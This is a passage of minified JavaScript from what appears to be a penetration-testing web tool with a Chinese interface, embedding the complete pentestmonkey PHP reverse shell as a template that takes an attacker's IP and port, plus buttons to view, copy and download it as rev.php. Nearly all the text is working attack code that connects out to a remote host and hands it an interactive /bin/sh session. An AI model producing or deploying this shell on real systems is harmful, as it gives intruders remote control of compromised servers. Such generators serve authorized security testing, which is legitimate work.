 // php-reverse-shell - A Reverse Shell implementation in PHP\n  // Copyright (C) 2007 pentestmonkey@pentestmonkey.net\n\n  set_time_limit (0);\n  $VERSION = "1.0";\n  $ip = '${t.ip}';  // You have changed this\n  $port = ${t.port};  // And this\n  $chunk_size = 1400;\n  $write_a = null;\n  $error_a = null;\n  $shell = 'uname -a; w; id; /bin/sh -i';\n  $daemon = 0;\n  $debug = 0;\n\n  //\n  // Daemonise ourself if possible to avoid zombies later\n  //\n\n  // pcntl_fork is hardly ever available, but will allow us to daemonise\n  // our php process and avoid zombies.  Worth a try...\n  if (function_exists('pcntl_fork')) {\n    // Fork and have the parent process exit\n    $pid = pcntl_fork();\n    \n    if ($pid == -1) {\n      printit("ERROR: Can't fork");\n      exit(1);\n    }\n    \n    if ($pid) {\n      exit(0);  // Parent exits\n    }\n\n    // Make the current process a session leader\n    // Will only succeed if we forked\n    if (posix_setsid() == -1) {\n      printit("Error: Can't setsid()");\n      exit(1);\n    }\n\n    $daemon = 1;\n  } else {\n    printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");\n  }\n\n  // Change to a safe directory\n  chdir("/");\n\n  // Remove any umask we inherited\n  umask(0);\n\n  //\n  // Do the reverse shell...\n  //\n\n  // Open reverse connection\n  $sock = fsockopen($ip, $port, $errno, $errstr, 30);\n  if (!$sock) {\n    printit("$errstr ($errno)");\n    exit(1);\n  }\n\n  // Spawn shell process\n  $descriptorspec = array(\n    0 => array("pipe", "r"),  // stdin is a pipe that the child will read from\n    1 => array("pipe", "w"),  // stdout is a pipe that the child will write to\n    2 => array("pipe", "w")   // stderr is a pipe that the child will write to\n  );\n\n  $process = proc_open($shell, $descriptorspec, $pipes);\n\n  if (!is_resource($process)) {\n    printit("ERROR: Can't spawn shell");\n    exit(1);\n  }\n\n  // Set everything to non-blocking\n  // Reason: Occsionally reads will block, even though stream_select tells us they won't\n  stream_set_blocking($pipes[0], 0);\n  stream_set_blocking($pipes[1], 0);\n  stream_set_blocking($pipes[2], 0);\n  stream_set_blocking($sock, 0);\n\n  printit("Successfully opened reverse shell to $ip:$port");\n\n  while (1) {\n    // Check for end of TCP connection\n    if (feof($sock)) {\n      printit("ERROR: Shell connection terminated");\n      break;\n    }\n\n    // Check for end of STDOUT\n    if (feof($pipes[1])) {\n      printit("ERROR: Shell process terminated");\n      break;\n    }\n\n    // Wait until a command is end down $sock, or some\n    // command output is available on STDOUT or STDERR\n    $read_a = array($sock, $pipes[1], $pipes[2]);\n    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);\n\n    // If we can read from the TCP socket, send\n    // data to process's STDIN\n    if (in_array($sock, $read_a)) {\n      if ($debug) printit("SOCK READ");\n      $input = fread($sock, $chunk_size);\n      if ($debug) printit("SOCK: $input");\n      fwrite($pipes[0], $input);\n    }\n\n    // If we can read from the process's STDOUT\n    // send data down tcp connection\n    if (in_array($pipes[1], $read_a)) {\n      if ($debug) printit("STDOUT READ");\n      $input = fread($pipes[1], $chunk_size);\n      if ($debug) printit("STDOUT: $input");\n      fwrite($sock, $input);\n    }\n\n    // If we can read from the process's STDERR\n    // send data down tcp connection\n    if (in_array($pipes[2], $read_a)) {\n      if ($debug) printit("STDERR READ");\n      $input = fread($pipes[2], $chunk_size);\n      if ($debug) printit("STDERR: $input");\n      fwrite($sock, $input);\n    }\n  }\n\n  fclose($sock);\n  fclose($pipes[0]);\n  fclose($pipes[1]);\n  fclose($pipes[2]);\n  proc_close($process);\n\n  // Like print, but does nothing if we've daemonised ourself\n  // (I can't figure out how to redirect STDOUT like a proper daemon)\n  function printit ($string) {\n    if (!$daemon) {\n      print "$string\n";\n    }\n  }\n\n  ?> \n  `;return n.default.createElement("div",null,g,n.default.createElement("div",null,n.default.createElement(p,{level:2,style:{fontWeight:"bold",margin:15}},"PHP 反弹 Shell"),n.default.createElement(m,{style:{margin:15}},"成功利用远程命令执行漏洞的攻击者，可以利用反弹 Shell 在目标机器上获得交互式 Shell 会话，从而继续攻击。"),n.default.createElement("div",{style:{padding:15}},n.default.createElement(i.Row,{gutter:{xs:8,sm:16,md:24,lg:32}},n.default.createElement(i.Col,{span:12},n.default.createElement(i.Input,{maxLength:15,prefix:n.default.createElement(o.WifiOutlined,null),name:"Ip adress",placeholder:"IP 地址或域名（例如：212.212.111.222）",onChange:a("ip"),value:t.ip})),n.default.createElement(i.Col,{span:12},n.default.createElement(i.Input,{maxLength:5,prefix:n.default.createElement(h,{type:"icon-Network-Plug"}),name:"Port",placeholder:"端口（例如：1337）",onChange:a("port"),value:t.port}))))),n.default.createElement(i.Divider,{orientation:"center"},"Pentestmonkey 的反弹 Shell"),n.default.createElement("div",{style:{padding:15,marginTop:15}},n.default.createElement(m,null,"该脚本会向硬编码的 IP 和端口发起出站 TCP 连接。"),n.default.createElement(i.Collapse,{defaultActiveKey:["0"]},n.default.createElement(v,{header:"查看源代码",key:"1"},n.default.createElement(u.default,{language:"php",style:s.vs2015,showLineNumbers:!0},(0,d.default)(x)),n.default.createElement(i.Button,{href:"https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php",target:"blank",type:"dashed",style:{marginBottom:10,marginTop:15}},n.default.createElement(o.ArrowsAltOutlined,{style:{marginRight:10}}),"Pentestmonkey 仓库"))),n.default.createElement(i.Button,{type:"primary",style:{marginBottom:10,marginTop:15},onClick:()=>{const e=document.createElement("a"),t=new Blob([x],{type:"text/plain"});e.href=URL.createObjectURL(t),e.download="rev.php",document.body.appendChild(e),e.click()}},n.default.createElement(o.DownloadOutlined,null),"下载"),n.default.createElement(c.default,{component:"a","data-clipboard-text":x}